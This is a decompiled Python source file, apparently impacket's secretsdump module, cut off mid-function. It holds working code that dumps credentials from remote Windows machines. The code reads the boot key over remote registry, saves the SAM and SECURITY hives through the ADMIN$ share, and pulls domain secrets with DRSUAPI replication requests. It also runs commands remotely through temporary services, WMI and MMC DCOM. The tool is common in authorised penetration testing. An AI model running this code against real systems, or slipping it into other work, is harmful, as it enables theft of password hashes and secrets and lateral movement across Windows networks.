# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.15 (default, Sep 28 2021, 20:18:52) 
# [GCC 10.2.1 20210110]
# Embedded file name: build\bdist.win32\egg\impacket\examples\secretsdump.py
import codecs, hashlib, logging, ntpath, os, random, string, time
from binascii import unhexlify, hexlify
from collections import OrderedDict
from datetime import datetime
from struct import unpack, pack
from impacket import LOG
from impacket import system_errors
from impacket import winregistry, ntlm
from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, VARIANT, VARENUM, DISPATCH_METHOD
from impacket.dcerpc.v5.dcomrt import DCOMConnection, OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM, OBJREF_HANDLER, OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, IRemUnknown2, INTERFACE
from impacket.ese import ESENT_DB
from impacket.smb3structs import FILE_READ_DATA, FILE_SHARE_READ
from impacket.nt_errors import STATUS_MORE_ENTRIES
from impacket.structure import Structure
from impacket.winregistry import hexdump
from impacket.uuid import string_to_bin
try:
    from Crypto.Cipher import DES, ARC4, AES
    from Crypto.Hash import HMAC, MD4
except ImportError:
    LOG.critical("Warning: You don't have any crypto installed. You need PyCrypto")
    LOG.critical('See http://www.pycrypto.org/')

class SAM_KEY_DATA(Structure):
    structure = (
     ('Revision', '<L=0'),
     ('Length', '<L=0'),
     ('Salt', '16s=""'),
     ('Key', '16s=""'),
     ('CheckSum', '16s=""'),
     ('Reserved', '<Q=0'))


class SAM_HASH(Structure):
    structure = (
     ('PekID', '<H=0'),
     ('Revision', '<H=0'),
     ('Hash', '16s=""'))


class SAM_KEY_DATA_AES(Structure):
    structure = (
     ('Revision', '<L=0'),
     ('Length', '<L=0'),
     ('CheckSumLen', '<L=0'),
     ('DataLen', '<L=0'),
     ('Salt', '16s=""'),
     ('Data', ':'))


class SAM_HASH_AES(Structure):
    structure = (
     ('PekID', '<H=0'),
     ('Revision', '<H=0'),
     ('DataOffset', '<L=0'),
     ('Salt', '16s=""'),
     ('Hash', ':'))


class DOMAIN_ACCOUNT_F(Structure):
    structure = (
     ('Revision', '<L=0'),
     ('Unknown', '<L=0'),
     ('CreationTime', '<Q=0'),
     ('DomainModifiedCount', '<Q=0'),
     ('MaxPasswordAge', '<Q=0'),
     ('MinPasswordAge', '<Q=0'),
     ('ForceLogoff', '<Q=0'),
     ('LockoutDuration', '<Q=0'),
     ('LockoutObservationWindow', '<Q=0'),
     ('ModifiedCountAtLastPromotion', '<Q=0'),
     ('NextRid', '<L=0'),
     ('PasswordProperties', '<L=0'),
     ('MinPasswordLength', '<H=0'),
     ('PasswordHistoryLength', '<H=0'),
     ('LockoutThreshold', '<H=0'),
     ('Unknown2', '<H=0'),
     ('ServerState', '<L=0'),
     ('ServerRole', '<H=0'),
     ('UasCompatibilityRequired', '<H=0'),
     ('Unknown3', '<Q=0'),
     ('Key0', ':'))


class USER_ACCOUNT_V(Structure):
    structure = (
     ('Unknown', '12s=""'),
     ('NameOffset', '<L=0'),
     ('NameLength', '<L=0'),
     ('Unknown2', '<L=0'),
     ('FullNameOffset', '<L=0'),
     ('FullNameLength', '<L=0'),
     ('Unknown3', '<L=0'),
     ('CommentOffset', '<L=0'),
     ('CommentLength', '<L=0'),
     ('Unknown3', '<L=0'),
     ('UserCommentOffset', '<L=0'),
     ('UserCommentLength', '<L=0'),
     ('Unknown4', '<L=0'),
     ('Unknown5', '12s=""'),
     ('HomeDirOffset', '<L=0'),
     ('HomeDirLength', '<L=0'),
     ('Unknown6', '<L=0'),
     ('HomeDirConnectOffset', '<L=0'),
     ('HomeDirConnectLength', '<L=0'),
     ('Unknown7', '<L=0'),
     ('ScriptPathOffset', '<L=0'),
     ('ScriptPathLength', '<L=0'),
     ('Unknown8', '<L=0'),
     ('ProfilePathOffset', '<L=0'),
     ('ProfilePathLength', '<L=0'),
     ('Unknown9', '<L=0'),
     ('WorkstationsOffset', '<L=0'),
     ('WorkstationsLength', '<L=0'),
     ('Unknown10', '<L=0'),
     ('HoursAllowedOffset', '<L=0'),
     ('HoursAllowedLength', '<L=0'),
     ('Unknown11', '<L=0'),
     ('Unknown12', '12s=""'),
     ('LMHashOffset', '<L=0'),
     ('LMHashLength', '<L=0'),
     ('Unknown13', '<L=0'),
     ('NTHashOffset', '<L=0'),
     ('NTHashLength', '<L=0'),
     ('Unknown14', '<L=0'),
     ('Unknown15', '24s=""'),
     ('Data', ':=""'))


class NL_RECORD(Structure):
    structure = (
     ('UserLength', '<H=0'),
     ('DomainNameLength', '<H=0'),
     ('EffectiveNameLength', '<H=0'),
     ('FullNameLength', '<H=0'),
     ('LogonScriptName', '<H=0'),
     ('ProfilePathLength', '<H=0'),
     ('HomeDirectoryLength', '<H=0'),
     ('HomeDirectoryDriveLength', '<H=0'),
     ('UserId', '<L=0'),
     ('PrimaryGroupId', '<L=0'),
     ('GroupCount', '<L=0'),
     ('logonDomainNameLength', '<H=0'),
     ('unk0', '<H=0'),
     ('LastWrite', '<Q=0'),
     ('Revision', '<L=0'),
     ('SidCount', '<L=0'),
     ('Flags', '<L=0'),
     ('unk1', '<L=0'),
     ('LogonPackageLength', '<L=0'),
     ('DnsDomainNameLength', '<H=0'),
     ('UPN', '<H=0'),
     ('IV', '16s=""'),
     ('CH', '16s=""'),
     ('EncryptedData', ':'))


class SAMR_RPC_SID_IDENTIFIER_AUTHORITY(Structure):
    structure = (('Value', '6s'), )


class SAMR_RPC_SID(Structure):
    structure = (
     ('Revision', '<B'),
     ('SubAuthorityCount', '<B'),
     (
      'IdentifierAuthority', ':', SAMR_RPC_SID_IDENTIFIER_AUTHORITY),
     ('SubLen', '_-SubAuthority', 'self["SubAuthorityCount"]*4'),
     ('SubAuthority', ':'))

    def formatCanonical(self):
        ans = 'S-%d-%d' % (self['Revision'], ord(self['IdentifierAuthority']['Value'][5]))
        for i in range(self['SubAuthorityCount']):
            ans += '-%d' % unpack('>L', self['SubAuthority'][i * 4:i * 4 + 4])[0]

        return ans


class LSA_SECRET_BLOB(Structure):
    structure = (
     ('Length', '<L=0'),
     ('Unknown', '12s=""'),
     ('_Secret', '_-Secret', 'self["Length"]'),
     ('Secret', ':'),
     ('Remaining', ':'))


class LSA_SECRET(Structure):
    structure = (
     ('Version', '<L=0'),
     ('EncKeyID', '16s=""'),
     ('EncAlgorithm', '<L=0'),
     ('Flags', '<L=0'),
     ('EncryptedData', ':'))


class LSA_SECRET_XP(Structure):
    structure = (
     ('Length', '<L=0'),
     ('Version', '<L=0'),
     ('_Secret', '_-Secret', 'self["Length"]'),
     ('Secret', ':'))


class RemoteFile():

    def __init__(self, smbConnection, fileName):
        self.__smbConnection = smbConnection
        self.__fileName = fileName
        self.__tid = self.__smbConnection.connectTree('ADMIN$')
        self.__fid = None
        self.__currentOffset = 0
        return

    def open(self):
        tries = 0
        while True:
            try:
                self.__fid = self.__smbConnection.openFile(self.__tid, self.__fileName, desiredAccess=FILE_READ_DATA, shareMode=FILE_SHARE_READ)
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >= 0:
                    if tries >= 3:
                        raise e
                    time.sleep(5)
                    tries += 1
                else:
                    raise e
            else:
                break

    def seek(self, offset, whence):
        if whence == 0:
            self.__currentOffset = offset

    def read(self, bytesToRead):
        if bytesToRead > 0:
            data = self.__smbConnection.readFile(self.__tid, self.__fid, self.__currentOffset, bytesToRead)
            self.__currentOffset += len(data)
            return data
        return ''

    def close(self):
        if self.__fid is not None:
            self.__smbConnection.closeFile(self.__tid, self.__fid)
            self.__smbConnection.deleteFile('ADMIN$', self.__fileName)
            self.__fid = None
        return

    def tell(self):
        return self.__currentOffset

    def __str__(self):
        return '\\\\%s\\ADMIN$\\%s' % (self.__smbConnection.getRemoteHost(), self.__fileName)


class RemoteOperations():

    def __init__(self, smbConnection, doKerberos, kdcHost=None):
        self.__smbConnection = smbConnection
        if self.__smbConnection is not None:
            self.__smbConnection.setTimeout(300)
        self.__serviceName = 'RemoteRegistry'
        self.__stringBindingWinReg = 'ncacn_np:445[\\pipe\\winreg]'
        self.__rrp = None
        self.__regHandle = None
        self.__stringBindingSamr = 'ncacn_np:445[\\pipe\\samr]'
        self.__samr = None
        self.__domainHandle = None
        self.__domainName = None
        self.__drsr = None
        self.__hDrs = None
        self.__NtdsDsaObjectGuid = None
        self.__ppartialAttrSet = None
        self.__prefixTable = []
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__bootKey = ''
        self.__disabled = False
        self.__shouldStop = False
        self.__started = False
        self.__stringBindingSvcCtl = 'ncacn_np:445[\\pipe\\svcctl]'
        self.__scmr = None
        self.__tmpServiceName = None
        self.__serviceDeleted = False
        self.__batchFile = '%TEMP%\\execute.bat'
        self.__shell = '%COMSPEC% /Q /c '
        self.__output = '%SYSTEMROOT%\\Temp\\__output'
        self.__answerTMP = ''
        self.__execMethod = 'smbexec'
        return

    def setExecMethod(self, method):
        self.__execMethod = method

    def __connectSvcCtl(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingSvcCtl)
        rpc.set_smb_connection(self.__smbConnection)
        self.__scmr = rpc.get_dce_rpc()
        self.__scmr.connect()
        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)

    def __connectWinReg(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingWinReg)
        rpc.set_smb_connection(self.__smbConnection)
        self.__rrp = rpc.get_dce_rpc()
        self.__rrp.connect()
        self.__rrp.bind(rrp.MSRPC_UUID_RRP)

    def connectSamr(self, domain):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingSamr)
        rpc.set_smb_connection(self.__smbConnection)
        self.__samr = rpc.get_dce_rpc()
        self.__samr.connect()
        self.__samr.bind(samr.MSRPC_UUID_SAMR)
        resp = samr.hSamrConnect(self.__samr)
        serverHandle = resp['ServerHandle']
        resp = samr.hSamrLookupDomainInSamServer(self.__samr, serverHandle, domain)
        resp = samr.hSamrOpenDomain(self.__samr, serverHandle=serverHandle, domainId=resp['DomainId'])
        self.__domainHandle = resp['DomainHandle']
        self.__domainName = domain

    def __connectDrds(self):
        stringBinding = epm.hept_map(self.__smbConnection.getRemoteHost(), drsuapi.MSRPC_UUID_DRSUAPI, protocol='ncacn_ip_tcp')
        rpc = transport.DCERPCTransportFactory(stringBinding)
        rpc.setRemoteHost(self.__smbConnection.getRemoteHost())
        rpc.setRemoteName(self.__smbConnection.getRemoteName())
        if hasattr(rpc, 'set_credentials'):
            rpc.set_credentials(*self.__smbConnection.getCredentials())
            rpc.set_kerberos(self.__doKerberos, self.__kdcHost)
        self.__drsr = rpc.get_dce_rpc()
        self.__drsr.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        if self.__doKerberos:
            self.__drsr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        self.__drsr.connect()
        self.__drsr.bind(drsuapi.MSRPC_UUID_DRSUAPI)
        if self.__domainName is None:
            self.__domainName = rpc.get_credentials()[2]
        request = drsuapi.DRSBind()
        request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
        drs = drsuapi.DRS_EXTENSIONS_INT()
        drs['cb'] = len(drs)
        drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | drsuapi.DRS_EXT_GETCHGREQ_V8 | drsuapi.DRS_EXT_STRONG_ENCRYPTION
        drs['SiteObjGuid'] = drsuapi.NULLGUID
        drs['Pid'] = 0
        drs['dwReplEpoch'] = 0
        drs['dwFlagsExt'] = 0
        drs['ConfigObjGUID'] = drsuapi.NULLGUID
        drs['dwExtCaps'] = 4294967295
        request['pextClient']['cb'] = len(drs)
        request['pextClient']['rgb'] = list(str(drs))
        resp = self.__drsr.request(request)
        if LOG.level == logging.DEBUG:
            LOG.debug('DRSBind() answer')
            resp.dump()
        drsExtensionsInt = drsuapi.DRS_EXTENSIONS_INT()
        ppextServer = ('').join(resp['ppextServer']['rgb']) + '\x00' * (len(drsuapi.DRS_EXTENSIONS_INT()) - resp['ppextServer']['cb'])
        drsExtensionsInt.fromString(ppextServer)
        if drsExtensionsInt['dwReplEpoch'] != 0:
            if LOG.level == logging.DEBUG:
                LOG.debug("DC's dwReplEpoch != 0, setting it to %d and calling DRSBind again" % drsExtensionsInt['dwReplEpoch'])
            drs['dwReplEpoch'] = drsExtensionsInt['dwReplEpoch']
            request['pextClient']['cb'] = len(drs)
            request['pextClient']['rgb'] = list(str(drs))
            resp = self.__drsr.request(request)
        self.__hDrs = resp['phDrs']
        resp = drsuapi.hDRSDomainControllerInfo(self.__drsr, self.__hDrs, self.__domainName, 2)
        if LOG.level == logging.DEBUG:
            LOG.debug('DRSDomainControllerInfo() answer')
            resp.dump()
        if resp['pmsgOut']['V2']['cItems'] > 0:
            self.__NtdsDsaObjectGuid = resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
        else:
            LOG.error("Couldn't get DC info for domain %s" % self.__domainName)
            raise Exception('Fatal, aborting')
        return

    def getDrsr(self):
        return self.__drsr

    def DRSCrackNames(self, formatOffered=drsuapi.DS_NAME_FORMAT.DS_DISPLAY_NAME, formatDesired=drsuapi.DS_NAME_FORMAT.DS_FQDN_1779_NAME, name=''):
        if self.__drsr is None:
            self.__connectDrds()
        LOG.debug('Calling DRSCrackNames for %s ' % name)
        resp = drsuapi.hDRSCrackNames(self.__drsr, self.__hDrs, 0, formatOffered, formatDesired, (name,))
        return resp

    def DRSGetNCChanges(self, userEntry):
        if self.__drsr is None:
            self.__connectDrds()
        LOG.debug('Calling DRSGetNCChanges for %s ' % userEntry)
        request = drsuapi.DRSGetNCChanges()
        request['hDrs'] = self.__hDrs
        request['dwInVersion'] = 8
        request['pmsgIn']['tag'] = 8
        request['pmsgIn']['V8']['uuidDsaObjDest'] = self.__NtdsDsaObjectGuid
        request['pmsgIn']['V8']['uuidInvocIdSrc'] = self.__NtdsDsaObjectGuid
        dsName = drsuapi.DSNAME()
        dsName['SidLen'] = 0
        dsName['Guid'] = string_to_bin(userEntry[1:-1])
        dsName['Sid'] = ''
        dsName['NameLen'] = 0
        dsName['StringName'] = '\x00'
        dsName['structLen'] = len(dsName.getData())
        request['pmsgIn']['V8']['pNC'] = dsName
        request['pmsgIn']['V8']['usnvecFrom']['usnHighObjUpdate'] = 0
        request['pmsgIn']['V8']['usnvecFrom']['usnHighPropUpdate'] = 0
        request['pmsgIn']['V8']['pUpToDateVecDest'] = NULL
        request['pmsgIn']['V8']['ulFlags'] = drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
        request['pmsgIn']['V8']['cMaxObjects'] = 1
        request['pmsgIn']['V8']['cMaxBytes'] = 0
        request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_OBJ
        if self.__ppartialAttrSet is None:
            self.__prefixTable = []
            self.__ppartialAttrSet = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
            self.__ppartialAttrSet['dwVersion'] = 1
            self.__ppartialAttrSet['cAttrs'] = len(NTDSHashes.ATTRTYP_TO_ATTID)
            for attId in NTDSHashes.ATTRTYP_TO_ATTID.values():
                self.__ppartialAttrSet['rgPartialAttr'].append(drsuapi.MakeAttid(self.__prefixTable, attId))

        request['pmsgIn']['V8']['pPartialAttrSet'] = self.__ppartialAttrSet
        request['pmsgIn']['V8']['PrefixTableDest']['PrefixCount'] = len(self.__prefixTable)
        request['pmsgIn']['V8']['PrefixTableDest']['pPrefixEntry'] = self.__prefixTable
        request['pmsgIn']['V8']['pPartialAttrSetEx1'] = NULL
        return self.__drsr.request(request)

    def getDomainUsers(self, enumerationContext=0):
        if self.__samr is None:
            self.connectSamr(self.getMachineNameAndDomain()[1])
        try:
            resp = samr.hSamrEnumerateUsersInDomain(self.__samr, self.__domainHandle, userAccountControl=samr.USER_NORMAL_ACCOUNT | samr.USER_WORKSTATION_TRUST_ACCOUNT | samr.USER_SERVER_TRUST_ACCOUNT | samr.USER_INTERDOMAIN_TRUST_ACCOUNT, enumerationContext=enumerationContext)
        except DCERPCException as e:
            if str(e).find('STATUS_MORE_ENTRIES') < 0:
                raise
            resp = e.get_packet()

        return resp

    def ridToSid(self, rid):
        if self.__samr is None:
            self.connectSamr(self.getMachineNameAndDomain()[1])
        resp = samr.hSamrRidToSid(self.__samr, self.__domainHandle, rid)
        return resp['Sid']

    def getMachineNameAndDomain(self):
        if self.__smbConnection.getServerName() == '':
            rpc = transport.DCERPCTransportFactory('ncacn_np:445[\\pipe\\wkssvc]')
            rpc.set_smb_connection(self.__smbConnection)
            dce = rpc.get_dce_rpc()
            dce.connect()
            dce.bind(wkst.MSRPC_UUID_WKST)
            resp = wkst.hNetrWkstaGetInfo(dce, 100)
            dce.disconnect()
            return (
             resp['WkstaInfo']['WkstaInfo100']['wki100_computername'][:-1],
             resp['WkstaInfo']['WkstaInfo100']['wki100_langroup'][:-1])
        else:
            return (
             self.__smbConnection.getServerName(), self.__smbConnection.getServerDomain())

    def getDefaultLoginAccount(self):
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
            keyHandle = ans['phkResult']
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultUserName')
            username = dataValue[:-1]
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultDomainName')
            domain = dataValue[:-1]
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
            if len(domain) > 0:
                return '%s\\%s' % (domain, username)
            return username
        except:
            return

        return

    def getServiceAccount(self, serviceName):
        try:
            ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, serviceName)
            serviceHandle = ans['lpServiceHandle']
            resp = scmr.hRQueryServiceConfigW(self.__scmr, serviceHandle)
            account = resp['lpServiceConfig']['lpServiceStartName'][:-1]
            scmr.hRCloseServiceHandle(self.__scmr, serviceHandle)
            if account.startswith('.\\'):
                account = account[2:]
            return account
        except Exception as e:
            if serviceName.endswith('_history') is False:
                LOG.error(e)
            return

        return

    def __checkServiceStatus(self):
        ans = scmr.hROpenSCManagerW(self.__scmr)
        self.__scManagerHandle = ans['lpScHandle']
        ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__serviceName)
        self.__serviceHandle = ans['lpServiceHandle']
        ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
        if ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
            LOG.info('Service %s is in stopped state' % self.__serviceName)
            self.__shouldStop = True
            self.__started = False
        elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
            LOG.debug('Service %s is already running' % self.__serviceName)
            self.__shouldStop = False
            self.__started = True
        else:
            raise Exception('Unknown service state 0x%x - Aborting' % ans['CurrentState'])
        if self.__started is False:
            ans = scmr.hRQueryServiceConfigW(self.__scmr, self.__serviceHandle)
            if ans['lpServiceConfig']['dwStartType'] == 4:
                LOG.info('Service %s is disabled, enabling it' % self.__serviceName)
                self.__disabled = True
                scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType=3)
            LOG.info('Starting service %s' % self.__serviceName)
            scmr.hRStartServiceW(self.__scmr, self.__serviceHandle)
            time.sleep(1)

    def enableRegistry(self):
        self.__connectSvcCtl()
        self.__checkServiceStatus()
        self.__connectWinReg()

    def __restore(self):
        if self.__shouldStop is True:
            LOG.info('Stopping service %s' % self.__serviceName)
            scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
        if self.__disabled is True:
            LOG.info('Restoring the disabled state for service %s' % self.__serviceName)
            scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType=4)
        if self.__serviceDeleted is False:
            try:
                rpc = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\svcctl]' % self.__smbConnection.getRemoteHost())
                if hasattr(rpc, 'set_credentials'):
                    rpc.set_credentials(*self.__smbConnection.getCredentials())
                    rpc.set_kerberos(self.__doKerberos, self.__kdcHost)
                self.__scmr = rpc.get_dce_rpc()
                self.__scmr.connect()
                self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
                ans = scmr.hROpenSCManagerW(self.__scmr)
                self.__scManagerHandle = ans['lpScHandle']
                resp = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName)
                service = resp['lpServiceHandle']
                scmr.hRDeleteService(self.__scmr, service)
                scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
                scmr.hRCloseServiceHandle(self.__scmr, service)
                scmr.hRCloseServiceHandle(self.__scmr, self.__serviceHandle)
                scmr.hRCloseServiceHandle(self.__scmr, self.__scManagerHandle)
                rpc.disconnect()
            except Exception as e:
                pass

    def finish(self):
        self.__restore()
        if self.__rrp is not None:
            self.__rrp.disconnect()
        if self.__drsr is not None:
            self.__drsr.disconnect()
        if self.__samr is not None:
            self.__samr.disconnect()
        if self.__scmr is not None:
            try:
                self.__scmr.disconnect()
            except Exception as e:
                if str(e).find('STATUS_INVALID_PARAMETER') >= 0:
                    pass
                else:
                    raise

        return

    def getBootKey(self):
        bootKey = ''
        ans = rrp.hOpenLocalMachine(self.__rrp)
        self.__regHandle = ans['phKey']
        for key in ['JD', 'Skew1', 'GBG', 'Data']:
            LOG.debug('Retrieving class info for %s' % key)
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
            keyHandle = ans['phkResult']
            ans = rrp.hBaseRegQueryInfoKey(self.__rrp, keyHandle)
            bootKey = bootKey + ans['lpClassOut'][:-1]
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)

        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
        bootKey = unhexlify(bootKey)
        for i in xrange(len(bootKey)):
            self.__bootKey += bootKey[transforms[i]]

        LOG.info('Target system bootKey: 0x%s' % hexlify(self.__bootKey))
        return self.__bootKey

    def checkNoLMHashPolicy(self):
        LOG.debug('Checking NoLMHash Policy')
        ans = rrp.hOpenLocalMachine(self.__rrp)
        self.__regHandle = ans['phKey']
        ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa')
        keyHandle = ans['phkResult']
        try:
            dataType, noLMHash = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'NoLmHash')
        except:
            noLMHash = 0

        if noLMHash != 1:
            LOG.debug('LMHashes are being stored')
            return False
        LOG.debug('LMHashes are NOT being stored')
        return True

    def __retrieveHive(self, hiveName):
        tmpFileName = ('').join([ random.choice(string.letters) for _ in range(8) ]) + '.tmp'
        ans = rrp.hOpenLocalMachine(self.__rrp)
        regHandle = ans['phKey']
        try:
            ans = rrp.hBaseRegCreateKey(self.__rrp, regHandle, hiveName)
        except:
            raise Exception("Can't open %s hive" % hiveName)

        keyHandle = ans['phkResult']
        rrp.hBaseRegSaveKey(self.__rrp, keyHandle, tmpFileName)
        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
        rrp.hBaseRegCloseKey(self.__rrp, regHandle)
        remoteFileName = RemoteFile(self.__smbConnection, 'SYSTEM32\\' + tmpFileName)
        return remoteFileName

    def saveSAM(self):
        LOG.debug('Saving remote SAM database')
        return self.__retrieveHive('SAM')

    def saveSECURITY(self):
        LOG.debug('Saving remote SECURITY database')
        return self.__retrieveHive('SECURITY')

    def __smbExec(self, command):
        self.__serviceDeleted = False
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName, self.__tmpServiceName, lpBinaryPathName=command)
        service = resp['lpServiceHandle']
        try:
            scmr.hRStartServiceW(self.__scmr, service)
        except:
            pass

        scmr.hRDeleteService(self.__scmr, service)
        self.__serviceDeleted = True
        scmr.hRCloseServiceHandle(self.__scmr, service)

    def __getInterface(self, interface, resp):
        objRefType = OBJREF(('').join(resp))['flags']
        objRef = None
        if objRefType == FLAGS_OBJREF_CUSTOM:
            objRef = OBJREF_CUSTOM(('').join(resp))
        elif objRefType == FLAGS_OBJREF_HANDLER:
            objRef = OBJREF_HANDLER(('').join(resp))
        elif objRefType == FLAGS_OBJREF_STANDARD:
            objRef = OBJREF_STANDARD(('').join(resp))
        elif objRefType == FLAGS_OBJREF_EXTENDED:
            objRef = OBJREF_EXTENDED(('').join(resp))
        else:
            logging.error('Unknown OBJREF Type! 0x%x' % objRefType)
        return IRemUnknown2(INTERFACE(interface.get_cinstance(), None, interface.get_ipidRemUnknown(), objRef['std']['ipid'], oxid=objRef['std']['oxid'], oid=objRef['std']['oxid'], target=interface.get_target()))

    def __mmcExec(self, command):
        command = command.replace('%COMSPEC%', 'c:\\windows\\system32\\cmd.exe')
        username, password, domain, lmhash, nthash, aesKey, _, _ = self.__smbConnection.getCredentials()
        dcom = DCOMConnection(self.__smbConnection.getRemoteHost(), username, password, domain, lmhash, nthash, aesKey, oxidResolver=False, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        iInterface = dcom.CoCreateInstanceEx(string_to_bin('49B2791A-B1AE-4C90-9B8E-E860BA07F889'), IID_IDispatch)
        iMMC = IDispatch(iInterface)
        resp = iMMC.GetIDsOfNames(('Document', ))
        dispParams = DISPPARAMS(None, False)
        dispParams['rgvarg'] = NULL
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 0
        dispParams['cNamedArgs'] = 0
        resp = iMMC.Invoke(resp[0], 1033, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
        iDocument = IDispatch(self.__getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
        resp = iDocument.GetIDsOfNames(('ActiveView', ))
        resp = iDocument.Invoke(resp[0], 1033, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
        iActiveView = IDispatch(self.__getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
        pExecuteShellCommand = iActiveView.GetIDsOfNames(('ExecuteShellCommand', ))[0]
        pQuit = iMMC.GetIDsOfNames(('Quit', ))[0]
        dispParams = DISPPARAMS(None, False)
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 4
        dispParams['cNamedArgs'] = 0
        arg0 = VARIANT(None, False)
        arg0['clSize'] = 5
        arg0['vt'] = VARENUM.VT_BSTR
        arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg0['_varUnion']['bstrVal']['asData'] = 'c:\\windows\\system32\\cmd.exe'
        arg1 = VARIANT(None, False)
        arg1['clSize'] = 5
        arg1['vt'] = VARENUM.VT_BSTR
        arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg1['_varUnion']['bstrVal']['asData'] = 'c:\\'
        arg2 = VARIANT(None, False)
        arg2['clSize'] = 5
        arg2['vt'] = VARENUM.VT_BSTR
        arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg2['_varUnion']['bstrVal']['asData'] = command[len('c:\\windows\\system32\\cmd.exe'):]
        arg3 = VARIANT(None, False)
        arg3['clSize'] = 5
        arg3['vt'] = VARENUM.VT_BSTR
        arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg3['_varUnion']['bstrVal']['asData'] = '7'
        dispParams['rgvarg'].append(arg3)
        dispParams['rgvarg'].append(arg2)
        dispParams['rgvarg'].append(arg1)
        dispParams['rgvarg'].append(arg0)
        iActiveView.Invoke(pExecuteShellCommand, 1033, DISPATCH_METHOD, dispParams, 0, [], [])
        dispParams = DISPPARAMS(None, False)
        dispParams['rgvarg'] = NULL
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 0
        dispParams['cNamedArgs'] = 0
        iMMC.Invoke(pQuit, 1033, DISPATCH_METHOD, dispParams, 0, [], [])
        return

    def __wmiExec(self, command):
        command = command.replace('%COMSPEC%', 'cmd.exe')
        username, password, domain, lmhash, nthash, aesKey, _, _ = self.__smbConnection.getCredentials()
        dcom = DCOMConnection(self.__smbConnection.getRemoteHost(), username, password, domain, lmhash, nthash, aesKey, oxidResolver=False, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        iWbemLevel1Login.RemRelease()
        win32Process, _ = iWbemServices.GetObject('Win32_Process')
        win32Process.Create(command, '\\', None)
        dcom.disconnect()
        return

    def __executeRemote(self, data):
        self.__tmpServiceName = ('').join([ random.choice(string.letters) for _ in range(8) ]).encode('utf-16le')
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile
        command += ' & del ' + self.__batchFile
        LOG.debug('ExecuteRemote command: %s' % command)
        if self.__execMethod == 'smbexec':
            self.__smbExec(command)
        elif self.__execMethod == 'wmiexec':
            self.__wmiExec(command)
        elif self.__execMethod == 'mmcexec':
